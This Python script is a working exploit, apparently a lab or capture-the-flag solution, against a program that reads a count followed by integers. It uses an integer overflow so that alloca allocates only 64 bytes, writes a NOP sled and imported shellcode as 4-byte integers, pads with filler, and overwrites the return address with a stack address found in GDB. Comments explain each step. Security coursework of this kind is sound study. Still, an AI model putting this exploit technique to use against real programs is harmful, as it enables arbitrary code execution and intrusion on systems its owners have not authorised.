#!/usr/bin/env python3

from shellcode import shellcode
import sys

# I'm using this count because when you multiply it by 4, it wraps around to just 64
# So alloca only gives us 64 bytes, but the loop still thinks count is huge
my_count = 0x4000000000000010

# First thing I need to write is the count (8 bytes, little endian format)
sys.stdout.buffer.write(my_count.to_bytes(8, "little"))

# I'm throwing in 20 NOPs before my shellcode
# This way if my address is off by a few bytes, I still land somewhere useful
padding = b"\x90" * 20
my_payload = padding + shellcode

# Need to make sure this divides evenly by 4 since we're writing integers
while len(my_payload) % 4 != 0:
    my_payload += b"\x90"

# Now I'll convert my payload into 4-byte chunks (integers)
# The program expects integers, so I'm giving it integers
for position in range(0, len(my_payload), 4):
    four_bytes = my_payload[position:position+4]
    as_integer = int.from_bytes(four_bytes, "little")
    sys.stdout.buffer.write(as_integer.to_bytes(4, "little"))

# Figure out how many integers I just wrote
how_many_ints = len(my_payload) // 4

# I need to fill up to integer 34 before I hit the return address
# So just spam some junk integers here
for filler in range(how_many_ints, 34):
    sys.stdout.buffer.write(filler.to_bytes(4, "little"))

# This is where my buffer starts - I got this from GDB
where_buffer_is = 0x7ffffff411c0

# I'm pointing to the middle of my NOP sled for safety
my_target = where_buffer_is + 10

# These last 2 integers (34 and 35) overwrite the return address
sys.stdout.buffer.write(my_target.to_bytes(8, "little"))